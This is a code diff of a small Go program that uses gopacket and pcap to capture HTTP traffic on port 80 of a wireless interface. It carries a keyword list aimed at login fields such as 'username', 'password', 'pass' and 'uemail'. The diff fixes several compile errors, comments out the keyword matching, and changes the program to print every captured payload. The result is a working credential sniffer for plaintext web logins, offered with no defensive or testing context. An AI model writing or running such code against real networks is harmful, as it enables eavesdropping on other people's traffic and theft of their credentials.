@@ -1,42 +1,40 @@
 package main
 
-
-// go get 
+// go get
 import (
 	"fmt"
 	"log"
-	"strings"
+
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/pcap"
 )
-
-
 
 var (
-	iface = "wlan0"
+	iface    = "wlan0"
 	devFound = false
-	snaplen = int32(1600)
-	timeout = pcap.BlockForever
-	filter = "tcp and port 80"
-	promisc = false
-
-
+	snaplen  = int32(1600)
+	timeout  = pcap.BlockForever
+	filter   = "tcp and port 80"
+	promisc  = false
 )
-
 
 var keywords = []string{
 	"username",
 	"password",
+	"uname",
+	"pass",
+	"urname",
+	"uemail",
 }
-
-
 
 func main() {
 
 	devs, err := pcap.FindAllDevs()
-	if er != nil {
+	if err != nil {
 		panic("hello world")
 	}
 
-	for _, dev := devs {
+	for _, dev := range devs {
 		if dev.Name == iface {
 			devFound = true
 		}
@@ -49,31 +47,28 @@ func main() {
 		}
 
 		defer handel.Close()
-		err = handel.SetFilter(filter)
+		err = handel.SetBPFFilter(filter)
 		if err != nil {
 			log.Fatal(err.Error())
 		}
 
+		src := gopacket.NewPacketSource(handel, handel.LinkType())
 
-		src := gopacket.NewPackageSource(handel, handel.LinkType())
-
-
-		for pkt := range source.Packets(){
+		for pkt := range src.Packets() {
 			applayer := pkt.ApplicationLayer()
 			if applayer == nil {
 				continue
 			}
 
 			payload := applayer.Payload()
+			fmt.Println(string(payload))
+			// for _, s := range keywords {
+			// 	index := strings.Index(string(payload), s)
+			// 	if index != -1 {
+			// 		fmt.Println(string(payload[index:]))
+			// 	}
+			// }
 
-			for _,s := range keywords {
-				index := strings.Index(string(payload))
-				if index != -1 {
-					 fmt.Println(string(payload[index:index+100000]))
-				}
-			}
-
-			 
 		}
 
 	}
